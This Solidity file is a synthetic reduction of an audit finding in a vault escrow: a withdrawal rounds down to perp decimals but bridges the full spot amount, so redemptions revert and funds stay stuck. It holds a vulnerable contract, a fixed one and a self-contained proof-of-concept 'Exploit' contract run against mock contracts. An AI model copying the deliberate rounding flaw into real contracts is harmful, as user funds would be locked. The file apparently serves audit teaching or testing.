// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Blueberry VaultEscrow — H-03 (Pashov, finding 61471)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: _withdrawFromL1Vault scales the L1 withdrawal down to perp
    decimals, then sendSpot bridges the original spot amount. With perp
    decimals 6 and spot decimals 8, 100001111 spot units become 1000011 perp
    units (100001100 spot units). sendSpot reverts and the redeem stays stuck. */

address constant USER = 0x2222222222222222222222222222222222222222;

contract SpotToken {
    string public name = "SPOT";
    string public symbol = "SPOT";
    uint8 public decimals = 0;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract L1Write {
    SpotToken public token;
    uint256 public available;

    constructor(SpotToken t) {
        token = t;
    }

    function sendVaultTransfer(address, bool, uint64 amountPerp) external {
        available = amountPerp;
    }

    function sendUsdClassTransfer(uint64 amountPerp, bool) external {
        available = uint256(amountPerp) * 100;
    }

    function sendSpot(address to, uint64, uint64 amountSpot) external {
        if (uint256(amountSpot) > available) {
            revert("spot shortfall");
        }
        available -= uint256(amountSpot);
        token.transfer(to, amountSpot);
    }
}

contract VaultEscrow {
    uint256 public perpDecimals = 6;
    uint256 public evmSpotDecimals = 8;
    L1Write public l1;
    mapping(address => uint64) public claimOf;

    constructor(L1Write l1_) {
        l1 = l1_;
    }

    function _scaleToPerpDecimals(uint64 assets_) internal view returns (uint256) {
        return uint256(assets_) / (10 ** (evmSpotDecimals - perpDecimals));
    }

    function _scaleToSpotDecimals(uint256 amountPerp) public view returns (uint256) {
        return amountPerp * (10 ** (evmSpotDecimals - perpDecimals));
    }

    function requestRedeem(address user, uint64 assets_) external {
        claimOf[user] = assets_;
    }

    function _withdrawFromL1Vault(uint64 assets_, address user) internal {
        uint256 amountPerp = _scaleToPerpDecimals(assets_);
        l1.sendVaultTransfer(address(this), false, uint64(amountPerp));
        l1.sendUsdClassTransfer(uint64(amountPerp), false);
        // @> VULN: bridges assets_ even though only the rounded perp amount was withdrawn
        l1.sendSpot(user, 0, assets_);
    }

    function pull(uint64 assets_, address user) external {
        require(msg.sender == address(this), "only self");
        _withdrawFromL1Vault(assets_, user);
        claimOf[user] = 0;
    }

    function settle(address user) external returns (bool paid) {
        uint64 assets_ = claimOf[user];
        try this.pull(assets_, user) {
            paid = true;
        } catch {
            paid = false;
        }
    }
}

contract VaultEscrowFixed {
    uint256 public perpDecimals = 6;
    uint256 public evmSpotDecimals = 8;
    L1Write public l1;
    mapping(address => uint64) public claimOf;

    constructor(L1Write l1_) {
        l1 = l1_;
    }

    function _scaleToPerpDecimals(uint64 assets_) internal view returns (uint256) {
        return uint256(assets_) / (10 ** (evmSpotDecimals - perpDecimals));
    }

    function _scaleToSpotDecimals(uint256 amountPerp) public view returns (uint256) {
        return amountPerp * (10 ** (evmSpotDecimals - perpDecimals));
    }

    function requestRedeem(address user, uint64 assets_) external {
        claimOf[user] = assets_;
    }

    function withdraw(address user) external {
        uint64 assets_ = claimOf[user];
        uint256 amountPerp = _scaleToPerpDecimals(assets_);
        l1.sendVaultTransfer(address(this), false, uint64(amountPerp));
        l1.sendUsdClassTransfer(uint64(amountPerp), false);
        uint64 fair = uint64(_scaleToSpotDecimals(amountPerp));
        l1.sendSpot(user, 0, fair);
        claimOf[user] = 0;
    }
}

contract Exploit {
    uint64 public constant STUCK = 100001111;
    uint64 public constant FAIR = 100001100;

    SpotToken public token;
    L1Write public l1;
    VaultEscrow public escrow;
    bool public paid;
    uint64 public claimLeft;

    constructor() {
        token = new SpotToken();
        l1 = new L1Write(token);
        escrow = new VaultEscrow(l1);
        token.mint(address(this), STUCK);
    }

    function run() external {
        token.transfer(address(l1), STUCK);
        escrow.requestRedeem(USER, STUCK);
        paid = escrow.settle(USER);
        claimLeft = escrow.claimOf(USER);
        require(paid == false, "withdraw did not revert");
        require(claimLeft == STUCK, "claim was cleared");
        require(token.balanceOf(USER) == 0, "user was paid");
        require(token.balanceOf(address(l1)) == STUCK, "spot units did not stay stuck");
    }
}
